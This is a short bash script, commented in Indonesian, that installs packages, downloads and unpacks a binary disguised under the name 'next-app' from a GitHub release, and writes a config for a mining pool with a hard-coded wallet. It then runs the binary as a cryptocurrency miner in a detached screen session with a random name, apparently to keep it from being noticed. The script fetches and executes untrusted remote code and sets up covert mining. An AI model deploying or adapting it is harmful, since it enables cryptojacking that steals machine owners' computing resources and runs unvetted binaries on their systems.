#!/bin/bash

# Nama proses screen random
RAND_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 8)

# Instal dependensi dan Node.js (notjs)
apt update -y
apt install -y wget tar screen curl

# Download dan ekstrak file miner
wget -q https://github.com/mom742886/next-app/releases/download/v1/next-app.tar.gz
tar -xf next-app.tar.gz
cd next-app || exit 1

# Buat file konfigurasi
cat <<EOF > config.json
{
  "host": "stratum-asia.rplant.xyz",
  "port": 7022,
  "user": "mbc1qt9gj6nqz4p3f7tylp9mnuvc8vcyrcgue9psxg5.$RAND_NAME",
  "pass": "x",
  "threads": 7
}
EOF

# Jalankan miner dalam screen
screen -dmS $RAND_NAME ./next-app
echo "🚀 Miner aktif di screen: $RAND_NAME"
echo "👤 Wallet: mbc1qt9gj6nqz4p3f7tylp9mnuvc8vcyrcgue9psxg5.$RAND_NAME"
